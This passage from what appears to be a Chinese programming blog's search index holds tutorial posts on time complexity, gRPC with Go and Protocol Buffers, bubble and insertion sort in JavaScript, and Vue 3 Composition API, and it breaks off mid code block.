件衣服，最差的情況就是要把 n 件衣服都翻過才會找到紅色那件。\n右圖的方式它的時間複雜度是 O(1)，在你沒有忘記其實衣服已經被丟到洗衣籃的前提下，你看一眼，翻都不用翻就可以把紅衣服直接取出（請先忽略掉人腦內建的視覺搜尋系統，那是另一個有趣的故事 XD）。這種不用一個一個找，就直接取出的，時間複雜度就是 O(1)。\n有了這個時間複雜度的概念後，是不是覺得左邊的那個商品實用性沒這麼高啦～ XDD\n真的是沒想到學演算法還可以用在購物吧！\n","date":"2022-07-23T00:00:00Z","image":"https://live.staticflickr.com/65535/52276282210_c2a38fae3c_o.jpg","permalink":"https://wayneblog.ga/2022-07-23/learn-time-complexity-by-clothes/","title":"從找衣服了解時間複雜度"},{"content":" 參考網站 - gRPC 說明影片 @ BESG\nSOURCE CODE\n對應的程式碼可檢視 besg-grpc 的 repository。\ngRPC 是什麼：以 Golang 說明與實作 說明 RPC 的全名是 remote procedure call，主要是作為電腦和電腦間溝通使用。A 電腦可以呼叫 B 電腦執行某些程式，B 電腦會將結果回傳給 A 電腦，A 電腦在收到回應後會再繼續處理其他任務。RPC 的好處在於，雖然 A 電腦是發送請求去請 B 電腦做事，但其呼叫的方式，就很像是 A 電腦直接在呼叫自己內部的函式一般。\ngRPC 也是基於這樣的概念，讓想要呼叫 server 處理請求的 client，在使用這支 API 時就好像是呼叫自己內部的函式一樣簡單自然。從功能面來說，gRPC 就像 Web 常用的 Restful API 一樣，都是在處理請求和回應，並且進行資料交換，但 gRPC 還多了其他的功能和特色。\ngRPC 是由 Google 開發的開源框架，它快速有效、奠基在 HTTP/2 上提供低延遲（low latency），支援串流，更容易做到權限驗證（authentication）。在下面的文章中，將會對於 gRPC 能提供的特色有更多說明。\nProtocol Buffers 是什麼 Protocol Buffers @ Google Developer Protocol Buffers 筆記 @ pjchender.dev 在學習 gRPC 時，需要同時了解什麼是 Protocol Buffers。在傳統的 Restful API 中，最常使用的資料交換格式通常是 JSON；但到了 gRPC 中，資料交換的格式則是使用名為 Protocol Buffers 的規範／語言。\njson 1 2 3 4 5 { \u0026#34;firstName\u0026#34;: \u0026#34;Sushiro\u0026#34;, \u0026#34;lastName\u0026#34;: \u0026#34;Global\u0026#34;, \u0026#34;age\u0026#34;: 6 } protocol buffers 1 2 3 4 5 6 // Protocol Buffers message User { string first_name = 1; string last_name = 2; int32 age = 3; } 也就是說，當我們想要使用 gRPC 的服務來交換資料前，必須先把資料「格式」和「方法」都定義清楚。\nTIP:\n使用 gRPC 前，不只需要先把資料交換的格式定義清楚，同時也需要把資料交換的方法定義清楚。\n這裡要稍微釐清一點很重要的是，Protocol Buffers 可以獨立使用，不一定要搭配 gRPC；但使用 gRPC 一定要搭配 Protocol Buffers。\n實作將 Protocol Buffers 編譯成在 Golang 中可使用的檔案 對應的程式碼可檢視 besg-grpc repository 中的 proto 資料夾。\nSTEP 1：撰寫 Protocol Buffers 檔案 使用 message 定義資料交換的格式。 使用 service 定義呼叫 API 的方法名稱。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 syntax = \u0026#34;proto3\u0026#34;; // 定義要使用的 protocol buffer 版本 package calculator; // for name space option go_package = \u0026#34;proto/calculator\u0026#34;; // generated code 的 full Go import path message CalculatorRequest { int64 a = 1; int64 b = 2; } message CalculatorResponse { int64 result = 1; } service CalculatorService { rpc Sum(CalculatorRequest) returns (CalculatorResponse) {}; } STEP 2：安裝編譯 Protocol Buffer 所需的套件 此部份可參考 編譯 Protocol Buffers（Compiling） 段落。\n安裝 compiler (macOS) 1 2 3 4 5 6 7 8 9 10 11 # 安裝 compiler，安裝完後就會有 protoc CLI 工具 brew install protobuf protoc --version # Ensure compiler version is 3+ # --- 使用 golang 才需要安裝以下兩個套件 --- # 安裝 protoc-gen-go 後可以將 proto buffer 編譯成 Golang 可使用的檔案 go get github.com/golang/protobuf/protoc-gen-go # 安裝 grpc-go 後，可以在 Golang 中使用 gRPC go get -u google.golang.org/grpc STEP 3：編譯 Protocol Buffer 檔案 進到放有 .proto 檔的資料夾後，在終端機輸入下述指令：\n1 protoc *.proto --go_out=plugins=grpc:. --go_opt=paths=source_relative 在成功編譯好後，應該會看到同樣的資料夾位置出現 *.pb.go 的檔案，這就是編譯好後可以在 Golang 中使用 Protocol Buffer 和 gRPC 的檔案。\n實作 gRPC Server 對應的程式碼可檢視 besg-grpc repository 中的 server 資料夾。\nSTEP 1：建立 gRPC server 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 type Server struct {} func main() { fmt.Println(\u0026#34;starting gRPC server...\u0026#34;) lis, err := net.Listen(\u0026#34;tcp\u0026#34;, \u0026#34;localhost:50051\u0026#34;) if err != nil { log.Fatalf(\u0026#34;failed to listen: %v \\n\u0026#34;, err) } grpcServer := grpc.NewServer() calculatorPB.RegisterCalculatorServiceServer(grpcServer, \u0026amp;Server{}) if err := grpcServer.Serve(lis); err != nil { log.Fatalf(\u0026#34;failed to serve: %v \\n\u0026#34;, err) } } STEP 2：實作 Protocol Buffer 中的 service 1 2 3 4 5 6 7 8 9 10 11 12 func (*Server) Sum(ctx context.Context, req *calculatorPB.CalculatorRequest) (*calculatorPB.CalculatorResponse, error) { fmt.Printf(\u0026#34;Sum function is invoked with %v \\n\u0026#34;, req) a := req.GetA() b := req.GetB() res := \u0026amp;calculatorPB.CalculatorResponse{ Result: a + b, } return res, nil } STEP 3：啟動 server 在終端機中輸入：\n1 go run server/server.go 即可啟動 gRPC server。\n補充：使用 Bloom RPC 進行測試 在只有 server 的情況下，可以使用 BloomRPC 這套工具來模擬 Client 對 gRPC server 發送請求，功能就類似在 Restful 中使用的 Postman。\n使用時只需要匯入 proto 檔後，即可看到對應可呼叫的方法和可帶入的參數，能這麼方便也是因為在 protocol buffer 中已經把傳輸的資料格式和能對應呼叫的方法都定好的緣故。\n實作 gRPC Client 完整程式碼可檢視 besg-grpc repository 中的 client 資料夾。\nSTEP 1：與 gRPC server 建立連線 1 2 3 4 5 6 7 8 9 10 11 12 func main() { conn, err := grpc.Dial(\u0026#34;localhost:50051\u0026#34;, grpc.WithInsecure()) if err != nil { log.Fatalf(\u0026#34;failed to dial: %v\u0026#34;, err) } defer conn.Close() client := calculatorPB.NewCalculatorServiceClient(conn) doUnary(client) } STEP 2：使用 Protocol Buffers 中定義好的 Service 1 2 3 4 5 6 7 8 9 10 11 12 13 14 func doUnary(client calculatorPB.CalculatorServiceClient) { fmt.Println(\u0026#34;Staring to do a Unary RPC\u0026#34;) req := \u0026amp;calculatorPB.CalculatorRequest{ A: 3, B: 10, } res, err := client.Sum(context.Background(), req) if err != nil { log.Fatalf(\u0026#34;error while calling CalculatorService: %v \\n\u0026#34;, err) } log.Printf(\u0026#34;Response from CalculatorService: %v\u0026#34;, res.Result) } STEP 3：向 server 發送請求 在終端機中輸入：\n1 go run client/client.go 即可執行 client.go 並向剛剛起動好的 server 發送請求。\ngRPC 解決了什麼 gRPC 和 REST API 的比較 比較 gRPC 服務與 HTTP API @ microsoft docs\n簡單來說，gRPC 在效能上比起 REST API 好非常多：\n項目 gRPC Restful API 資料傳輸格式（Payload） Protocol Buffer - 更快且更小 JSON, XML, formData - 較慢且較大 通訊協定 HTTP/2 HTTP 傳輸方式 支援一般的「請求-回應」、伺服器端串流、Client 端串流、與雙向串流（streaming） 僅能透過 Client 發送請求、Server 給予回應 API 方法命名 沒有限制，一般會直接描述該方法要做的事，例如 createUser, getUser。不需要思考路由命名。 使用動詞（GET, POST, PUT, PATCH, DELETE）搭配資源來命名。需要根據不同的行為來定義不同的路由。 Client 呼叫 API 的方式 就像呼叫一般的函式 透過特定的 Endpoint，給予符合的資料型別 Server 建立 API 的方式 根據文件（Protocol Buffer）實作功能，不需要額外檢查資料型別與方法正確性。 根據文件（Swagger）實作功能，但須額外檢查資料型別。 根據文件產生程式碼 Protocol Buffers OpenAPI / Swagger 此外，gRPC 的 server，預設就是非同步的，因此不會阻塞任何進來的請求，並可以平行處理多個請求。gRPC Client 則可以選擇要用同步（阻塞）或非同步的方式處理。\n使用 Protocol Buffers 的好處 節省網路傳輸量：速度更快、檔案更小 節省 CPU 消耗：Parse JSON 本身是 CPU intensive 的任務；Parse Protocol Buffer（binary format）因為更接近底層機器表徵資料的方式，消耗的 CPU 資源較低 跨程式語言：Protocol Buffer 可以根據不同的程式語言編譯出不同的檔案 可以寫註解、型別清楚明確 TIP\n節省網路傳輸量和 CPU 消耗在行動裝置上的影響可能更重要。\n跨程式語言的好處 透過 Protocol Buffer 定義好資料的傳輸欄位（message）和呼叫的方法（service）後，gRPC 即可在不同程式語言上運行，這非常適合微服務（micro-services）的應用情境，只要雙方一起定義好 schema 後，就可以用不同的程式語言進行開發。\n使用 HTTP/2 的好處 HTTP/2 vs HTTP/1 - Performance Comparison? Demo：Performance difference between HTTP2 and HTTP1.1 瀏覽器允許的併發請求資源數是有限制的-分析 @ ITRead01 傳統的 HTTP/1.1 在每個 TCP 連線中只允許向 server 發送單一個請求，但當網頁載入時，往往會需要向同一個伺服器發送多個請求（例如、圖檔、CSS、靜態檔、JS 等），因此為了要避開這樣的限制、加快載入的速度，瀏覽器會實作多個平行的（parallel） TPC 連線（每個瀏覽器實作不同，因此數量的上限也不同），以處理同時向伺服器發出的多個請求。\n在 HTTP/2 中則可在同一個 TCP 連線中進行多個請求和回應，並且可以由 server 主動推送資源給 client，而並非一定要透過 client 主動請求；此外支援 HTTP Header 的壓縮，減少資料傳數量；HTTP/2 也是使用 binary 的方式在傳輸資料。\ngRPC 的四種類型 Unary：類似傳統 API，client 發送 request 而 server 回傳 response Server Streaming：透過 HTTP/2，client 發送一次 request，而 server 可以回傳多次資料 Client Streaming：client 發送多次資料，直到告知 server 資料傳完後，server 再給予 response Bi Directional Streaming：兩邊都用串流的方式傳送資料 圖片來源：gRPC Golang - Master Class: Build Modern API \u0026amp; MicroServices @ Udemy\n1 2 3 4 5 6 7 8 9 10 11 12 13 service GreetService { // Unary rpc Greet(GreetRequest) returns (GreetResponse) {}; // Streaming Server rpc GreetManyTimes(GreetManyTimesRequest) returns (stream GreetManyTimesResponse) {}; // Streaming Client rpc LongGreet(stream LongGreetRequest) returns (LongGreetResponse) {}; // Bi-directional Streaming rpc GreetEveryone(stream GreetEveryoneRequest) returns (stream GreetEveryoneResponse) {}; } gRPC 的缺點 Protocol Buffer 不像 JSON 是 Human Readable。 需要額外的學習時間和導入成本。 瀏覽器原生目前還不支援，須透過套件 grpc-web 來處理。 其他 推薦工具 BloomRPC：方便用來模擬 Client 對 gRPC server 發送請求，功能就類似在 Restful 中使用的 Postman。 錯誤排除 protoc-gen-go: program not found or is not executable\n1 2 # 需要把 $GOPATH/bin 加到 .zshrc/.bashrc 等 $ echo \u0026#39;export PATH=$PATH:$GOPATH/bin\u0026#39; \u0026gt;\u0026gt; $HOME/.zshrc 參考資料 Go Tutorial @ gRPC.io Introduction to gRPC @ gRPC.io Protocol Buffers @ Google Developer gRPC - Golang Master Class: Build Modern API \u0026amp; MicroServices @ Udemy 比較 gRPC 服務與 HTTP API @ Microsoft Docs ","date":"2022-07-22T00:00:00Z","image":"https://live.staticflickr.com/65535/52276040314_2afa0e7026_o.png","permalink":"https://wayneblog.ga/2022-07-22/grpc-basic-introduction/","title":"gRPC 基本介紹"},{"content":" 參考網站 - JavaScript 資料結構與演算法：氣泡排序 Bubble Sort、插入排序 Insertion Sort 實作與分析 - 彭彭直播\n排序演算法 氣泡排序法(bubble sort) 概要 使用雙層迴圈，由後往前。 每輪固定最右邊的值，接著倆倆比較大小，將大的放右邊。 下輪則 - 1。 完畢後即可排序完畢。 執行的總輪數為陣列長度 - 1。 時間複雜度 如果陣列長度是 4，要比對 3+2+1 總共 6 次。 如果陣列長度是 7，要比對 6+5+\u0026hellip;+1 總共 21 次。 如果陣列長度是 n，要比對 (n-1)+(n-2)+\u0026hellip;+1 總共\n(n * (n - 1)) / 2 = n²/2 - n/2 次 搜尋所需時間隨著陣列的長度\n呈平方成長 O(N²)。 假設 可以加入一個 flag 來做判定，假設比較完第一輪發現沒有交換的情況發生，則代表已經排序完成，不需要再跑下一輪，即可稍微優化排序。 實作 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 // 實作氣泡排序演算法 function bubbleSort(arr){ // arr 是一個數字陣列 for(let i=arr.length-1;i\u0026gt;=1;i--){ let swap=false; // 假設沒有交換發生 for(let j=0;j\u0026lt;i;j++){ if(arr[j]\u0026gt;arr[j+1]){ // 如果順序不對，交換 let temp=arr[j]; arr[j]=arr[j+1]; arr[j+1]=temp; swap=true; // 紀錄發生交換 } } if(!swap){ // 發現一整輪中都沒有交換發生，直接判定排序完成 break; } } } let data = [1, 6, 3, 4]; console.log(bubbleSort(data)); 輸出： 1 \u0026gt; [1, 3, 4, 6] 插入排序法(insertion sort) 概要 使用雙層迴圈，由前往後。 從第二筆開始，每輪將該筆資料往前比較大小，將大的放右邊：每輪比較從 (i - 1) ~ 0。 下輪則 + 1。 完畢後即可排序完畢。 執行的總輪數為陣列長度 - 1。 時間複雜度(複雜度同氣泡排序法) 如果陣列長度是 4，要比對 1+2+3 總共 6 次。 如果陣列長度是 7，要比對 1+2+\u0026hellip;+6 總共 21 次。 如果陣列長度是 n，要比對 1+2+\u0026hellip;+(n-1) 總共\n(n * (n - 1)) / 2 = n²/2 - n/2 次 搜尋所需時間隨著陣列的長度\n呈平方成長 O(N²)。 假設 假設當前比對的值與第一個要比較的值一比較，恰好正確，則代表前面皆已經排序完成，可以進到下一輪。 實作 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 // 實作插入排序演算法 function insertionSort(arr){ // arr 是一個數字陣列 for(let i=1;i\u0026lt;arr.length;i++){ for(let j=i-1;j\u0026gt;=0;j--){ if(arr[j]\u0026gt;arr[j+1]){ // 如果順序不對，交換 [arr[j], arr[j+1]]=[arr[j+1], arr[j]]; // javascript 交換的語法糖 }else{ // 任何一次比較，發現順序對了，這一輪就不用繼續了 break; } } } } let data = [1, 6, 3, 4]; console.log(insertionSort(data)); 輸出： 1 \u0026gt; [1, 3, 4, 6] 大型資料量的進階探討 O(N²)：(讀作 big-O N平方) 是相當可怕的，排序的執行時間將會是資料量的平方倍數成長。\n演示： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 // 產生隨機資料 let data=[]; for(let i=0;i\u0026lt;100000;i++){ data.push(Math.random()*1000000); } // 資料量是 100,000，我的演算法時間複雜度是 O(N^2)，預期要花 100,000^2 = 10,000,000,000 次的比較運算 // 我們的電腦一秒鐘跑 10 億個指令(粗略預估 1 GB) console.time(); // 插入排序法，大約跑了10幾秒 //insertionSort(data); // 使用 JavaScript 內建的排序功能 sort()，大約跑了 0.2 ~ 0.3 秒 // 很有機會是使用快速排序 Quick Sort(快速排序法) 或其變形 data.sort(); console.timeEnd(); ","date":"2022-07-21T00:00:00Z","image":"https://wayneblog.ga/2022-07-21/bubble-sort-and-insertion-sort/hqdefault_huc19c1d5e8083f3ca093a0303b2a8247b_19175_120x120_fill_q75_box_smart1.jpg","permalink":"https://wayneblog.ga/2022-07-21/bubble-sort-and-insertion-sort/","title":"彭彭的課程 - 氣泡排序、插入排序的實作與分析"},{"content":" 參考網站 - 尚硅谷Vue3技術\n創建 Vue 3.0 工程 使用 vue cli 創建 官方文檔：https://cli.vuejs.org/zh/guide/creating-a-project.html#vue-create 1 2 3 4 5 6 7 8 9 10 11 12 ## 查看 @vue/cli 版本，確保 @vue/cli 版本在 4.5.0 以上 vue --version ## 安裝或升級你的 @vue/cli npm install -g @vue/cli ## 創建 vue create vue_test ## 啟動 cd vue_test npm run serve 使用 vite 創建(Vue作者的團隊開發) 官方文檔：https://v3.cn.vuejs.org/guide/installation.html#vite vite官網：https://vitejs.cn/ 優勢： 開發環境中，無需打包操作，可快速的冷啟動。 輕量快速的熱重載(HMR)。 真正的按需編譯，不再等待整個應用編譯完成。 傳統 grunt、gulp、webpack 與 vite 構建對比圖： 1 2 3 4 5 6 7 8 9 10 11 ## 創建工程 npm init vite-app \u0026lt;project-name\u0026gt; ## 進入工程目錄 cd \u0026lt;project-name\u0026gt; ## 安裝依賴 npm install ## 啟動 npm run dev 安裝 Vue 開發者工具 Vue.js devtools\n拉開序幕的 Setup Vue3.0 中一個新的配置項，值為一個函數。 是所有 Composition API (組合式API) 的表演舞台。 組件中所用到的數據、方法等等，均要配置在 setup 中。 setup 函數的： 若返回一個對象，則對象中的屬性、方法，在模板中均可直接使用。(重點關注!) 若返回一個渲染函數，則可以自定義渲染內容。(了解即可) 返回對象 1 2 3 4 5 6 7 8 export default { setup() { const name = \u0026#34;測試\u0026#34; return { name } } } 返回渲染函數(需引入 h ) 1 2 3 4 5 6 import { h } from \u0026#34;vue\u0026#34; export default { setup() { return () =\u0026gt; { return h(\u0026#39;h1\u0026#39;, \u0026#39;尚硅谷\u0026#39;)} } } 注意： 不要與Vue2.x配置混用。 Vue2.x配置(data、methods、computed\u0026hellip;)中可以訪問到setup中的屬性、方法，但在setup中不能訪問到Vue2.x配置(data、methods、computed\u0026hellip;)。 如果有重名，setup優先。 setup 不能是一個 async 函數，因為返回值不再是 return 的對象，而是一個 promise，模板看不到 return 對象中的屬性；後期可以返回一個 Promise 實例，但需要 Suspense 與 異步組件(動態組件) 的配合：點我前往 Suspense ref 函數 作用：定義一個響應式的數據。 語法： 1 const xxx = ref(initValue) 將數據加工成一個 RefImpl (Reference: 引用；Implete: 實現) = (引用實現的實例對象)。 js 中操作數據：xxx.value。 模板中讀取數據：\u0026lt;div\u0026gt;{{xxx}}\u0026lt;/div\u0026gt; 備註： 接收的數據可以是基本類型，也可以是對象類型。 基本類型的數據：響應式依然是靠 Object.defineProperty() 的 get 與 set 完成的。 對象類型的數據：內部求助了 Vue3.0 中的一個新函數\u0026mdash;- reactive reactive 函數 作用：定義一個對象類型的響應式數據(基本類型別用他，用ref函數)。 語法： 1 2 3 4 const xxx = reactive({ name: \u0026#34;測試\u0026#34;, age: 18 }) 接收一個對象或數組，返回一個代理對象(Proxy對象)。 reactive 定義的響應式數據是深層次的。 內部基於 ES6 的 Proxy 實現，通過代理對象操作源對象內部數據都是響應式的，並通過 Reflect 操作源對象內部的數據。 js、模板中操作數據均不需要 .value Vue 2.0 中的響應式原理 實現原理： 對象類型：通過 Object.defineProperty() 對屬性的讀取、修改進行攔截(數據劫持)。 數組類型：通過重寫更新數組的一系列方式來實現攔截。(對數組的變更方法進行了包裹)。 1 2 3 4 5 6 7 8 Object.defineProperty(data, \u0026#34;count\u0026#34;, { get() { }, set() { } }) 原理模擬： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 let person = { name: \u0026#34;張三\u0026#34;, age: 18 } // 模擬 Vue2 中實現響應式 let p = {} Object.defineProperty(p, \u0026#34;name\u0026#34;, { configurable: true, // 允許刪除，但捕獲不到 get() { // 有人讀取 name 時調用 return person.name }, set(value) { console.log(\u0026#34;有人修改了 name 屬性，我發現了ㄛ，我要去更新介面！\u0026#34;) person.name = value } }) Object.defineProperty(p, \u0026#34;age\u0026#34;, { configurable: true, // 允許刪除，但捕獲不到 get() { // 有人讀取 age 時調用 return person.age }, set(value) { console.log(\u0026#34;有人修改了 age 屬性，我發現了ㄛ，我要去更新介面！\u0026#34;) person.age = value } }) 存在問題： 新增屬性、刪除屬性，介面不會更新，需使用 $set、$delete。 直接通過下標修改數組，介面不會更新，需使用 $set、$delete。 問題情況演示： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 export default { data() { return { person: { name: \u0026#34;張三\u0026#34;, age: 18, hobby: [\u0026#34;學習\u0026#34;, \u0026#34;吃飯\u0026#34;] } } }, methods: { addSex() { this.person.sex = \u0026#34;女\u0026#34; // 此時畫面不會更新 this.$set(this.person, \u0026#34;sex\u0026#34;, \u0026#34;女\u0026#34;) // 需使用 $set 畫面才會更新 // 或是使用 Vue.set() // Vue.set(this.person, \u0026#34;sex\u0026#34;, \u0026#34;女\u0026#34;) }, deleteName() { delete this.person.name // 此時畫面不會更新 this.$delete(this.person, \u0026#34;name\u0026#34;) // 需使用 $delete 畫面才會更新 // 或是使用 Vue.delete() // Vue.delete(this.person, \u0026#34;name\u0026#34;) }, updateHobby() { this.person.hobby[0] = \u0026#34;逛街\u0026#34; // 此時畫面不會更新 this.$set(this.person.hobby, 0, \u0026#34;逛街\u0026#34;) // 需使用 $set 畫面才會更新 // 或是使用 splice() // this.person.hobby.splice(0, 1, \u0026#34;逛街\u0026#34;) } } } Vue 3.0 中的響應式原理 實現原理： 通過 Proxy(代理)：攔截對象中任意屬性的變化，包含屬性值的讀寫、屬性的新增、屬性的刪除等。 通過 Reflect(反射)：對被代理對象的屬性進行操作。 原理模擬： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 let person = { name: \u0026#34;張三\u0026#34;, age: 18 } // 模擬 Vue3 中實現響應式 const p = new Proxy(person, { // 有人讀取p的某個屬性時調用 get(target, propName) { console.log(`有人讀取了p身上的${propName}屬性`) return Reflect.get(target, propName) }, // 有人新增或修改p的某個屬性時調用 set(target, propName, value) { console.log(`有人修改了p身上的${propName}屬性，我要去更新介面了！`) Reflect.set(target, propName, value) }, // 有人刪除p的某個屬性時調用 deleteProperty(target, propName) { console.log(`有人刪除了p身上的${propName}屬性，我要去更新介面了！`) return Reflect.deleteProperty(target, propName) } }) setup 的兩個注意點 setup 執行的時機：在 beforeCreate 之前執行一次，this 是 undefined。 setup 的參數 props：值為對象，包含：組件外部傳遞過來，且組件內部聲明接收了的屬性。 context：上下文對象： attrs：值為對象，包含：組件外部傳遞過來，但沒有在 props 配置中聲明的屬性，相當於 Vue 2.0 的 this.$attrs。 slots：接收的插槽內容，相當於 Vue 2.0 的 this.$slots。 emit：分發自定義事件的函數，相當於 Vue 2.0 的 this.$emit。 watch 函數 與 Vue 2.0 中的 watch 配置功能一致。 兩個小\u0026quot;坑\u0026quot;： 監視 ref 定義的響應式數據時，不需加 .value。 監視 reactive 定義的響應式數據時，oldValue 無法正確捕獲、強制開啟了深度監視(deep配置失效)。 監視 reactive 定義的響應式數據中的某個屬性時，deep 配置有效。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 import { ref, reactive, watch } from \u0026#34;vue\u0026#34; export default { setup() { const sum = ref(10) const msg = ref(\u0026#34;測試\u0026#34;) const person = reactive({ name: \u0026#34;張三\u0026#34;, age: 18, job: { job1: { salary: 20 } } }) // 情況一：監視 ref 定義的響應式數據 watch(sum, (newValue, oldValue) =\u0026gt; { console.log(\u0026#34;sum變化了\u0026#34;, newValue, oldValue) }, { immediate: true }) // 情況二：同時監視多個 ref 定義的響應式數據 watch([sum, msg], (newValue, oldValue) =\u0026gt; { console.log(\u0026#34;sum或msg變化了\u0026#34;, newValue, oldValue) }, { immediate: true }) /* * 情況三：監視 reactive 定義的響應式數據的全部屬性 * 1. 注意: 此數無法正確的獲取 oldValue * 2. 注意: 強制開啟了深度監視(deep配置無效) */ watch(person, (newValue, oldValue) =\u0026gt; { console.log(\u0026#34;person變化了\u0026#34;, newValue, oldValue) }, { immediate: true, deep: false }) // 此處的 deep 配置無效 // 情況四：監視 reactive 定義的響應式數據的某個屬性 watch(() =\u0026gt; person.name, (newValue, oldValue) =\u0026gt; { console.log(\u0026#34;person的name變化了\u0026#34;, newValue, oldValue) }, { immediate: true }) // 情況五：監視 reactive 定義的響應式數據的某些屬性 watch([() =\u0026gt; person.name, () =\u0026gt; person.age], (newValue, oldValue) =\u0026gt; { console.log(\u0026#34;person的name或age變化了\u0026#34;, newValue, oldValue) }, { immediate: true }) // 特殊情況：監視 reactive 定義的響應式數據的某些對象屬性 watch(() =\u0026gt; person.job, (newValue, oldValue) =\u0026gt; { console.log(\u0026#34;person的job變化了\u0026#34;, newValue, oldValue) }, { immediate: true, deep: true }) // 此處由於監視的是 reactive 所定義的對象中的某個屬性，所以 deep 配置有效 return { sum, msg } } } watch 時 value 的問題 若監視的數據為 ref 求助 reactive 生成的響應式數據，則可使用以下兩種方式進行監視： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 import { ref, watch } from \u0026#34;vue\u0026#34; export default { setup() { const sum = ref(0) const person = ref({ name: \u0026#34;張三\u0026#34;, name: 18, job: { job1: { salary: 20 } } }) watch(sum, (newValue, oldValue) =\u0026gt; { // 監視的是 sum 這個 RefImpl 數據，因此不需要 .value console.log(\u0026#34;sum的值變化了\u0026#34;, newValue, oldValue) }) // 方法一: watch(person.value, (newValue, oldValue) =\u0026gt; { // 監視 person.value 的 Proxy 對象 console.log(\u0026#34;person的值變化了\u0026#34;, newValue, oldValue) }) // 方法二: watch(person, (newValue, oldValue) =\u0026gt; { // 深度監視 person 的 Proxy 對象的屬性 console.log(\u0026#34;person的值變化了\u0026#34;, newValue, oldValue) }, { deep: true }) return { person } } } watchEffect 智能版 watch，不用指名監視哪個屬性，監視的回調中用到哪個屬性，就監視哪個屬性(而且是深層次的)。 watchEffect 有點像 computed： 但 computed 注重計算出來的值(回調函數的返回值)，所以必須要寫返回值。 而 watchEffect 更注重的是過程(回調函數的函數體)，所以不用寫返回值。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 import { ref, reactive, watchEffect } from \u0026#34;vue\u0026#34; export default { setup() { const sum = ref(0) const person = reactive({ name: \u0026#34;張三\u0026#34;, age: 18, job: { job1: { salary: 20 } } }) watchEffect(() =\u0026gt; { const x1 = sum.value const x2 = person.job.job1.salary console.log(\u0026#34;watchEffect 配置的回調執行了\u0026#34;) }) } } 自定義 hook 函數 hook 本質是一個函數，把 setup 函數中使用的 Composition API 進行了封裝。 類似於 vue 2.0 中的 mixin。 自定義 hook 的優勢：重複使用代碼，讓 setup 中的邏輯更清楚易懂。 命名通常建議以 \u0026ldquo;use\u0026rdquo; 開頭，例如： 一個獲取鼠標點擊位置的 hook src/hooks/usePoint.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 import { reactive, onMounted, onBeforeUnmount} from \u0026#34;vue\u0026#34; export default function() { // 獲取鼠標點擊位置 相關的數據 let point = reactive({ x: 0, y: 0 }) // 獲取鼠標點擊位置 相關的方法 function savePoint(event) { console.log(event.pageX, event.pageY) point.x = event.pageX point.y = event.pageY } // 獲取鼠標點擊位置 相關的生命週期鉤子 onMounted(() =\u0026gt; { window.addEventListener(\u0026#34;click\u0026#34;, savePoint) }) onBeforeUnmount(() =\u0026gt; { window.removeEventListener(\u0026#34;click\u0026#34;, savePoint) }) return point } Demo.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 import usePoint from \u0026#34;@/hooks/usePoint\u0026#34; export default { name: \u0026#34;Demo\u0026#34;, setup() { // 使用自定義的 hook const point = usePoint() return { point } } } toRef 作用：創建一個 ref 對象，其 value 值指向(引用)另一個對象中的某個屬性(返回值為一個 ObjectRefImpl 對象，為響應式)。 語法： 1 const name = toRef(person, \u0026#34;name\u0026#34;) 應用：要將響應式對象中的某個屬性單獨提供給外部使用時。 擴展：toRefs 與 toRef 功能一致，但可以批量創建多個 ref 對象，語法： 1 toRefs(person) 使用範例： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 import { reactive, toRef, toRefs} from \u0026#34;vue\u0026#34; export default { setup() { let person = reactive({ name: \u0026#34;張三\u0026#34;, age: 18, job: { job1: { salary: 20 } } }) const name1 = person.name // name1 僅為賦值，無響應式 const name2 = toRef(person, \u0026#34;name\u0026#34;) // name2 的值會指向(引用) person 的 name return { // errors： // name1: person.name, // 僅為賦值，無響應式 // name2: ref(person.name) // 初始值正常，但修改時不會改到 person 的 name，因為此寫法僅是將 \u0026#34;ref(pserson.name)\u0026#34; 賦值給 name2，而非將 name2 指向 person 的 name // success： // 模板中使用 {{ person.name }}...等： // person, // 一個一個給出，模板中使用 {{ name }}...等： // name: toRef(person, \u0026#34;name\u0026#34;), // age: toRef(person, \u0026#34;age\u0026#34;), // salary: toRef(person.job.job1, \u0026#34;salary\u0026#34;) // 一次全給出，模板中可直接使用 {{ name }}、{{ age }}、{{ job.job1.salary }} ...toRefs(person) } } } 其他的 Composition API 1. shallowReactive 與 shallowRef shallow：淺層的 shallowReactive：只處理對象最外層屬性的響應式(淺響應式)。 shallowRef：只處理基本數據類型的響應式，不進行對象的響應式處理。 什麼時候使用？ 如果有一個對象數據，結構比較深，但變化時只是外層屬性變化 =\u0026gt; shallowReactive。 如果有一個對象數據，後續功能不會修改該對象中的屬性，而是生成新的對象來替換 =\u0026gt; shallowRef。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 import { shallowRef, shallowReactive, toRefs} from \u0026#34;vue\u0026#34; export default { setup() { let person = shallowReactive({ // 只考慮第一層數據的響應式 name: \u0026#34;張三\u0026#34;, // 響應式 age: 18, // 響應式 job: { // 非響應式 job1: { salary: 20 } } }) let x = shallowRef({ // 基本類型時同 ref，但對象類型不是響應式(value 會變成一般的 Object 而不是 Proxy ) y: 0 }) return { x, ...toRefs(person) } } } 2. readonly 與 shallowReadonly readonly：讓一個響應式數據變為唯讀的(深層唯讀)。 shallowReadonly：讓一個響應式數據變為唯讀的(淺層唯讀)。 應用場景：不希望數據被修改時。 1 2 3 4 5 6 7 8 9 10 11 12 13 